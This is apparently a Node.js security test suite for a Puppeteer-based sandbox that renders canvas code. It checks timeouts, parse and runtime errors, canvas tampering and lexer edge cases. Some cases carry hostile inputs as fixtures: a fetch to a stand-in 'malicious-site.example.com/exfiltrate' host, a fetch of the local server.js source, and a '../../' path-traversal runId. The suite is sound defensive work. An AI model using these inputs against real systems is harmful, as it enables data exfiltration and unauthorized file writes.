const { renderCode, closeBrowser } = require('./sandbox');
const fs = require('fs');
const path = require('path');

async function run() {
    console.log("Running Enhanced Security Smoke Tests...\n");
    
    const cases = [
        {
            name: "Infinite Loop Defense",
            code: "function setup() { while(true){} }",
            expect: "TIMEOUT",
            runId: "sec_test_loop",
            options: { page_load_timeout_ms: 3000, code_execution_timeout_ms: 3000 }
        },
        {
            name: "Invalid JavaScript Syntax",
            code: "function setup() { let x = ; }",
            expect: "PARSE_ERROR",
            runId: "sec_test_syntax"
        },
        {
            name: "Missing Canvas Extraction",
            code: "function setup() { let c = document.querySelector('canvas'); if(c) c.remove(); window.signalRenderComplete(); }",
            expect: "NO_CANVAS",
            runId: "sec_test_nocanvas"
        },
        {
            name: "Runtime Crash Handling",
            code: "function setup() { createCanvas(100,100,WEBGL); throw new Error('intentional_crash'); }",
            expect: "RUNTIME_ERROR",
            runId: "sec_test_crash"
        },
        {
            name: "Network Exfiltration Prevention (fetch)",
            code: `function setup() {
                createCanvas(100, 100, WEBGL);
                fetch('https://malicious-site.example.com/exfiltrate').catch(() => {});
            }`,
            // Should succeed in rendering canvas locally while Puppeteer request interception aborts external URL
            expect: "SUCCESS",
            runId: "sec_test_net"
        },
        {
            name: "Signal Tampering Resilience",
            code: `function setup() {
                try {
                    window.signalRenderComplete = null;
                } catch(e) {}
                createCanvas(100, 100, WEBGL);
                background(200);
            }`,
            expect: "SUCCESS",
            runId: "sec_test_proto"
        },
        {
            name: "Directory Traversal in runId Sanitization",
            code: "function setup() { createCanvas(100, 100, WEBGL); background(150); }",
            expect: "SUCCESS",
            runId: "../../traversal_test_file"
        },
        {
            name: "Canvas Removal & Tampering",
            code: `function setup() {
                createCanvas(100, 100, WEBGL);
                const canvases = document.querySelectorAll('canvas');
                canvases.forEach(c => c.style.display = 'none');
            }`,
            expect: "NO_CANVAS",
            runId: "sec_test_tamper"
        },
        {
            name: "Local Source Exfiltration Prevention (server.js)",
            code: `function setup() {
                createCanvas(100, 100, WEBGL);
                background(100);
                fetch('server.js').then(r => r.text()).catch(() => {});
            }`,
            expect: "SUCCESS",
            runId: "sec_test_local_server"
        },
        {
            name: "Delimiters in Ignored Contexts (Lexer Defense)",
            code: `function setup() {
                createCanvas(100, 100, WEBGL);
                let str = "unmatched string ( { [";
                let re = /[{()}]/g;
                let tmpl = \`unmatched template ( { [\`;
                // single comment with ( and {
                /* multi comment with ( and { */
                background(120);
            }`,
            expect: "SUCCESS",
            runId: "sec_test_lexer_delims"
        }
    ];
    
    let passedCount = 0;
    let failedCount = 0;

    for (const c of cases) {
        process.stdout.write(`  [TEST] ${c.name.padEnd(45, '.')}`);
        const result = await renderCode(c.code, 42, c.runId, c.options || {});
        
        if (result.error_classification === c.expect) {
            console.log(` [PASS] (Got: ${result.error_classification})`);
            passedCount++;
        } else {
            console.log(` [FAIL] (Expected: ${c.expect}, Got: ${result.error_classification})`);
            console.error("        Result details:", result);
            failedCount++;
        }
    }
    
    // Check that directory traversal didn't create a file outside renders dir
    const outsideFiles = [
        path.resolve(__dirname, '../traversal_test_file.png'),
        path.resolve(__dirname, '../../traversal_test_file.png')
    ];
    let traversalLeak = false;
    for (const outsideFile of outsideFiles) {
        if (fs.existsSync(outsideFile)) {
            console.error(`  [FAIL] Directory traversal vulnerability detected: ${outsideFile} was created!`);
            try { fs.unlinkSync(outsideFile); } catch(e) {}
            traversalLeak = true;
        }
    }
    if (traversalLeak) {
        failedCount++;
    } else {
        console.log("  [PASS] Directory traversal check: no files created outside renders folder.");
    }
    
    console.log(`\nSecurity Suite Summary: ${passedCount} Passed, ${failedCount} Failed`);
    await closeBrowser();
    
    if (failedCount > 0) {
        process.exit(1);
    }
}

run();
